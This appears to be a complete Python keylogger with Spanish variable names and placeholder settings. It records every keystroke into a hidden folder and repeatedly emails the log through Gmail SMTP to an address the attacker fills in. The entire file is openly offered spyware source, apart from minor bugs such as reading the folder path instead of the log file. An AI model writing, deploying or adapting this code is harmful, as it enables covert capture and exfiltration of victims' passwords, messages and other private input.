import sys
import smtplib
import os
import asyncio
from pynput import keyboard as kb
from getpass import getuser
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

user = getuser()
os.makedirs(f"RUTA/keys", exist_ok = True)
os.system(f"attrib +h RUTA/keys")

loop = asyncio.get_event_loop()

def pulsa(tecla):
    valor = str(tecla).replace("'", "")
    if valor == "Key.space":
        valor = " "
    elif valor == "Key.enter":
        valor = "\n"
    elif valor == "Key.shift_r" or valor == "Key.shift":
        valor = ""
    with open(f"RUTA/keys/keys", "a") as log:
        log.write(valor)

async def exec():
    while True:
        with kb.Listener(pulsa) as escuchador:
            escuchador.join()
            await asyncio.sleep(60)

async def enviar():
    while True:
        msg = MIMEMultipart("plain")
        password = "CONTRASEÑA_APP_GMAIL"
        msg['From'] = "CORREO_REMITENTE"
        msg['To'] = "CORREO_DESTINATARIO"
        msg['Subject'] = "Log"

        mensaje = MIMEText(open(f"RUTA/keys", "r").read(), "plain")
        msg.attach(mensaje)
        smtp = smtplib.SMTP("smtp.gmail.com: 587")
        smtp.starttls()
        smtp.login(msg['From'], password)

        smtp.sendmail(msg['From'], msg['To'], msg.as_string())
        smtp.quit()

asyncio.ensure_future(exec())
asyncio.ensure_future(enviar())
loop.run_forever()